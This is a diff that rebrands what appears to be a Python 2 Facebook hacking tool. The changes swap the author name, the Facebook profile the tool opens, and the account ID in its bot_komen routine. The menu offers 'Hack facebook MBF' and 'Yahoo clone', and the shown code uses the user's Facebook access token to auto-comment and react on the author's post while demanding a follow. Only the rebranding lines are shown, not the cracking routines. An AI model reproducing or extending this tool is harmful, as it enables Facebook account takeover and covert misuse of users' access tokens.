@@ -66,7 +66,7 @@ logo = """
 ██║░░██╗██╔══██╗███████║██║░░██╗██╔═██╗░
 ╚█████╔╝██║░░██║╚════██║╚█████╔╝██║░╚██╗
 ░╚════╝░╚═╝░░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;41;97mAuthor : KARMA DAVID\033[0m
+\033[1;41;97mAuthor : Okoro Onyedikachi\033[0m
  """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -123,7 +123,7 @@ def tokenz():
 		zedd.close()
 		jalan ('\033[1;97mYou MUST FOLLOW ME FB ALC TO WORK SUCCEEFUL :) ')
 		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Alhamdulillah'
-		os.system('xdg-open  https://www.facebook.com/onyemai')
+		os.system('xdg-open  https://www.facebook.com/Corneliuschinedumsunday1')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Salah !"
@@ -137,7 +137,7 @@ def bot_komen():
 	except IOError:
 		print"\033[1;39m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100047165779215')
+	una = ('100004412526309')
 	kom = ('Assalamualaikum😊')
 	reac = ('LOVE')
 	post = ('213235326925325')
@@ -181,7 +181,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;93m1.\x1b[1;93m Hack facebook MBF"
-	print "\x1b[1;93m2.\x1b[1;93m View Lost Of Groups              "
+	print "\x1b[1;93m2.\x1b[1;93m View List Of Groups              "
 	print "\x1b[1;93m3.\x1b[1;93m Account Information              "
 	print "\x1b[1;93m4.\x1b[1;93m Yahoo clone               "
 	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
